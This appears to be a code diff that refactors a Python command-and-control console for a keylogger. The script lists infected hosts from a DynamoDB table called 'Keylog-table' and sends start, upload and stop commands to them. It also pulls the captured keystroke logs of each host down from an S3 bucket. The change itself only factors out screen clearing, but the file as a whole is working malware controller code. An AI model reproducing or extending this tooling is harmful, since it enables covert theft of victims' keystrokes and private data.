@@ -5,28 +5,24 @@ from boto3.dynamodb.conditions import Key
 from dotenv import load_dotenv
 import re
 
-def main():
+def clear():
+    os.system('cls' if os.name == 'nt' else 'clear')
 
+def main():
     load_dotenv()
 
     dynamodb = boto3.resource('dynamodb')
-
     items = pull_items(dynamodb)
-
     host_names = [item.get('hostName') for item in items if 'hostName' in item]
-
-    os.system('cls' if os.name == 'nt' else 'clear')
-
+    clear()
     print('Host(s) available:')
 
     for name in host_names:
         print(f'{name}')
-
     print('\n')
 
     host_name = input('Select host(s): ')
-    os.system('cls' if os.name == 'nt' else 'clear')
-
+    clear()
     host_names_lowercase = [item.lower() for item in host_names]
 
     while True:
@@ -35,7 +31,7 @@ def main():
             host_name = lookup.get(host_name.lower())
             break
         else:
-            os.system('cls' if os.name == 'nt' else 'clear')
+            clear()
             print('Host not available\n')
             main()
 
@@ -45,12 +41,9 @@ def main():
     )
 
     item = response.get('Item')
-
     cmd = item['curr_cmd']
-
     select_cmds(host_name, dynamodb, cmd)
-    os.system('cls' if os.name == 'nt' else 'clear')
-    
+    clear()
 
 def update_cmds(host_name, cmd, dynamodb):
     table = dynamodb.Table('Keylog-table')
@@ -62,10 +55,8 @@ def update_cmds(host_name, cmd, dynamodb):
 
 def pull_items(dynamodb):
     table = dynamodb.Table('Keylog-table')
-
     response = table.scan()
     items = response.get('Items', [])
-
     return items
 
 def download_files(host_name):
@@ -76,19 +67,14 @@ def download_files(host_name):
     object_map = {}
 
     count = 1
-
     for object in objects:
         if host_name in object.key:
             print(f'{object.key} // {count}')
-
             object_map[count] = object
-
             count += 1
-
     print('\n')
 
     selection = input('Enter number to download or type ALL to download all: ').strip().lower()
-
     if selection == 'all':
         for object in objects:
             if host_name in object.key:
@@ -96,45 +82,41 @@ def download_files(host_name):
                 #bucket.Object(object.key).delete()
     if bool(re.search(r'\d', selection)) == True:
         if int(selection) > count or int(selection) <= 0:
-            os.system('cls' if os.name == 'nt' else 'clear')
+            clear()
             print(f'{selection} does not exist. Try < {count} \n')
             download_files(host_name)
         else:
             obj = object_map.get(int(selection))
             bucket.download_file(obj.key, f'{obj.key}')
             #bucket.Object(obj.key).delete()
-
-    os.system('cls' if os.name == 'nt' else 'clear')
-
+    clear()
     print('Download successful!\n')
-
-
 
 def select_cmds(host_name, dynamodb, cmd):
     print(f'Currently on host: {host_name} | Current cmd: {cmd}')
     while True:
-        cmd = input('Enter cmd:\n- Start\n- Upload\n- Stop\n- Reselect\n- Download\n- Exit\n\n').strip().lower()
-        
+        cmd = input('Enter cmd:\n- Start\n- Upload\n- Stop\n- Reselect\n- Download\n- Exit\n\n').strip().lower()        
         if cmd == 'start':
-            os.system('cls' if os.name == 'nt' else 'clear')
+            clear()
             update_cmds(host_name, cmd, dynamodb)
         elif cmd == 'upload':
-            os.system('cls' if os.name == 'nt' else 'clear')
+            clear()
             update_cmds(host_name, cmd, dynamodb)
         elif cmd == 'stop':
-            os.system('cls' if os.name == 'nt' else 'clear')
+            clear()
             update_cmds(host_name, cmd, dynamodb)
         elif cmd == 'download':
-            os.system('cls' if os.name == 'nt' else 'clear')
+            clear()
             download_files(host_name)
         elif cmd == 'reselect':
-            os.system('cls' if os.name == 'nt' else 'clear')
+            clear()
             main()
         elif cmd == 'exit':
             sys.exit(0)
         else:
-            os.system('cls' if os.name == 'nt' else 'clear')
+            clear()
             print('ERROR - Misinput')
+
 
 if __name__ == '__main__':
     main()
